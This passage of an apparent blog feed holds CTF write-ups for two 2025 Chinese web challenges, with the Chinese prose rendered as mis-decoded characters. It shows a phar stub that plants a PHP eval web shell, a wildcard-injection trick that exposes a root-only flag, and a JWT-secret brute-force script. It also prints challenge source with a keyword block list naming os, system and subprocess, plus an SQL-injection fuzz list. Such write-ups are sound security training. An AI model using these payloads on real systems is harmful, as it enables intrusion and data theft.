class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"str too long"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼æ‰“ phar.gz åŒ…å«ï¼Œgzip å‹ç¼©ç»•è¿‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exploit.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span><span class="token operator">&lt;</span><span class="token operator">?</span>php    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "&lt;?php eval(\$_POST[0]); ?>" > /var/www/html/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>STUB;$phar->setStub($stub);$phar->addFromString('test.txt', 'test');$phar->stopBuffering();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå¦å¤–ä¸‰ä¸ªç±»ä¸éœ€è¦äº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Acheron</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mode</span><span class="token operator">=</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Acheron</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™å…¥å¹¶åŒ…å«</p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908210600047.png"></p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908210922151.png"></p><p>æ­¤æ—¶å°±å†™ shell åˆ° 1.php äº†ï¼Œantsword è¿ä¸Šå»</p><p>å‘ç° flag æ²¡æƒé™è¯»ï¼Œä½†æ˜¯æ ¹ç›®å½•æœ‰ run.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /var/www/html/<span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/    <span class="token function">sleep</span> <span class="token number">10</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»å…¸é€šé…ç¬¦åœ¨é‡æ³¨å…¥ï¼Œåœ¨ &#x2F;var&#x2F;www&#x2F;html ä¸‹æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token operator">></span><span class="token string">'-L'</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶å flag å°±åœ¨ backup é•¿å‡ºæ¥äº†</p><hr><h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>ç»™äº†ä¸€ä¸ªæ‰§è¡Œ pyyaml å’Œ python ä»£ç çš„åŠŸèƒ½ï¼Œä½†æ˜¯åªæœ‰ admin æ‰ä½¿ç”¨</p><p>é‚£ä¹ˆéœ€è¦å…ˆæå®š jwtï¼Œåœ¨ &#x2F;sandbox è·¯ç”±æ•…æ„ä¿®æ”¹ jwt ä¸ºé”™è¯¯æ ¼å¼è§¦å‘æŠ¥é”™ï¼Œè¿”å›ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"error"</span><span class="token operator">:</span><span class="token string">"JWT Decode Failed. Key Hint"</span><span class="token punctuation">,</span><span class="token property">"hint"</span><span class="token operator">:</span><span class="token string">"Key starts with \"@o70xO$0%#qR9#**\". The 2 missing chars are alphanumeric (letters and numbers)."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„æ€å°±æ˜¯è¦çˆ†ç ´ key çš„åä¸¤ä½ï¼ŒèŒƒå›´åœ¨å­—æ¯å’Œæ•°å­—é‡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    known_part <span class="token operator">=</span> <span class="token string">"@o70xO$0%#qR9#"</span>    token <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E"</span>        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits        <span class="token keyword">for</span> c1 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        <span class="token keyword">for</span> c2 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            key <span class="token operator">=</span> known_part <span class="token operator">+</span> c1 <span class="token operator">+</span> c2            <span class="token keyword">try</span><span class="token punctuation">:</span>                decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Decoded payload: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>decoded<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Exception: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´å¾—åˆ° keyï¼š <code>@o70xO$0%#qR9#m0</code></p><p>é‚å¯ä»¥ä¼ªé€  jwt ä¼  yaml æ‰“ååºåˆ—åŒ–ï¼Œmkdir åˆ›å»º static æ–‡ä»¶å¤¹ç„¶åå†™å…¥é™æ€æ–‡ä»¶å¸¦å‡ºæ‰§è¡Œç»“æœ</p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908204116198.png"></p><p>flag åœ¨ &#x2F;f1111ag</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> jwt<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> yaml<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>JWT_SECRET <span class="token operator">=</span> <span class="token string">"@o70xO$0%#qR9#m0"</span>JWT_ALGO <span class="token operator">=</span> <span class="token string">"HS256"</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'communicate'</span><span class="token punctuation">,</span>             <span class="token string">'Popen'</span><span class="token punctuation">,</span> <span class="token string">'decode'</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">]</span>HTML_PAGE <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;!DOCTYPE html>&lt;html>&lt;head>    &lt;title>Vault&lt;/title>    &lt;style>        body &#123; font-family: "Segoe UI", sans-serif; background-color: #f4f4f4; padding: 40px; text-align: center; &#125;        #user-info &#123; margin-bottom: 40px; font-weight: bold; font-size: 18px; color: #333; &#125;        #sandbox-container &#123; margin-top: 30px; &#125;        select, input, button &#123; font-size: 16px; margin: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc; &#125;        #result &#123; background: #222; color: #0f0; padding: 15px; width: 80%; margin: 20px auto; white-space: pre-wrap; border-radius: 8px; text-align: left; &#125;        button &#123; background-color: #4CAF50; color: white; border: none; cursor: pointer; &#125;        button:hover &#123; background-color: #45a049; &#125;        input[type="file"] &#123; display: block; margin: 10px auto; &#125;    &lt;/style>&lt;/head>&lt;body>    &lt;div id="user-info">Loading user info...&lt;/div>    &lt;div id="sandbox-container">        &lt;select id="mode">            &lt;option value="yaml" selected>YAML&lt;/option>            &lt;option value="python">Python&lt;/option>        &lt;/select>        &lt;br>        &lt;input type="file" id="codefile">        &lt;br>        &lt;button onclick="runCode()">â–¶ Execute from File&lt;/button>        &lt;pre id="result">Waiting for output...&lt;/pre>    &lt;/div>    &lt;script>        let token = "";        fetch("/auth")            .then(res => res.json())            .then(data => &#123;                token = data.token;                const payload = JSON.parse(atob(token.split('.')[1]));                document.getElementById("user-info").innerHTML =                    "&lt;span style='color:#444'>ğŸ‘¤ " + payload.username + "&lt;/span> | " +                    "&lt;span style='color:#4CAF50'>Role: " + payload.role + "&lt;/span>";            &#125;);        function runCode() &#123;            const fileInput = document.getElementById('codefile');            const mode = document.getElementById("mode").value;            if (fileInput.files.length === 0) &#123;                document.getElementById("result").textContent = '&#123;"error": "Please select a file to upload."&#125;';                return;            &#125;            const file = fileInput.files[0];            const formData = new FormData();            formData.append('codefile', file);            formData.append('mode', mode);            fetch("/sandbox", &#123;                method: "POST",                headers: &#123;                    "Authorization": "Bearer " + token                &#125;,                body: formData            &#125;)            .then(res => res.json())            .then(data => &#123;                document.getElementById("result").textContent = JSON.stringify(data, null, 2);            &#125;);        &#125;    &lt;/script>&lt;/body>&lt;/html>'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>HTML_PAGE<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/auth'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># é»˜è®¤åˆ†å‘ä¸€ä¸ªä½æƒé™çš„ 'user' token</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> JWT_SECRET<span class="token punctuation">,</span> algorithm<span class="token operator">=</span>JWT_ALGO<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        token <span class="token operator">=</span> token<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_code_safe</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    auth_header <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> auth_header<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Invalid token format'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>    token <span class="token operator">=</span> auth_header<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'codefile'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No file part in the request'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'codefile'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No file selected'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    mode <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'mode'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Could not read or decode file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>token<span class="token punctuation">,</span> code<span class="token punctuation">,</span> mode<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Token, code, or mode is empty'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> JWT_SECRET<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span>JWT_ALGO<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        partial_key <span class="token operator">=</span> JWT_SECRET<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'JWT Decode Failed. Key Hint'</span><span class="token punctuation">,</span>            <span class="token string">'hint'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Key starts with "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>partial_key<span class="token punctuation">&#125;</span></span><span class="token string">**". The 2 missing chars are alphanumeric (letters and numbers).'</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Permission Denied: admin only'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'python'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> is_code_safe<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'forbidden keyword detected'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            scope <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> scope<span class="token punctuation">)</span>            result <span class="token operator">=</span> scope<span class="token punctuation">[</span><span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'result'</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'yaml'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            obj <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>code<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>UnsafeLoader<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'result'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'invalid mode'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸éš¾&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Golang" scheme="http://c1oudfl0w0.github.io/blog/tags/Golang/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="Yaml" scheme="http://c1oudfl0w0.github.io/blog/tags/Yaml/"/>
    
  </entry>
  
  <entry>
    <title>é™‡å‰‘æ¯2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/06/%E9%99%87%E5%89%91%E6%9D%AF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/06/%E9%99%87%E5%89%91%E6%9D%AF2025/</id>
    <published>2025-09-06T06:10:56.000Z</published>
    <updated>2025-09-19T02:20:50.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é»‘ç›’ pickle æ˜¯åæ–‡æ˜ï¼</p><span id="more"></span><hr><h1 id="forge"><a href="#forge" class="headerlink" title="forge"></a>forge</h1><p>åªæœ‰æ³¨å†Œå’Œç™»å½•ä¸¤ä¸ªè·¯ç”±ï¼Œå…¶ä¸­ç™»å½•å¤„ only admin can login</p><p>ä½†æ˜¯æ³¨å†Œèƒ½æ­£å¸¸æ³¨å†Œç”¨æˆ·</p><p>login å¤„æœ‰è¿‡æ»¤ï¼Œfuzz å¾—åˆ° </p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">å¯ç”¨: ['SELECT', 'UNION', 'WHERE', 'limit', 'group', 'by', 'like', 'prepare', 'as', 'if', 'sleep', 'char', 'ascii', 'mid', 'left', 'right', 'substring', 'updatexml', 'extractvalue', 'benchmark', 'insert', 'update', 'all', '@', '^', '&amp;', "'", '"', '~', '`', '(', ')', '=', '\\', 'database', 'column', "'1'='1", 'count', 'concat', 'cot', 'replace', '.']ä¸å¯ç”¨: ['select', 'union', 'union select', 'and', 'or', '||', 'where', 'from', 'order', 'ORDER', 'handler', '#', '*', '--', '/', ' ', 'information_schema', ';', 'rand', 'floor']<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸€æ—¶åŠä¼šæƒ³ä¸åˆ°ç»•è¿‡çš„æ–¹æ³•</p><p>å°è¯•æ³¨å†Œ admin è´¦æˆ·ï¼Œè¿”å› try to bybassï¼ŒçŒœæµ‹æ˜¯é€»è¾‘ç»•è¿‡</p><p>å°è¯•åœ¨ &#x2F;register å¤§å°å†™ç»•è¿‡æ³¨å†Œ</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/register</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-2803794189.challenge.longjiancup.cn</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://web-67b31d46ab.challenge.longjiancup.cn/register</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name 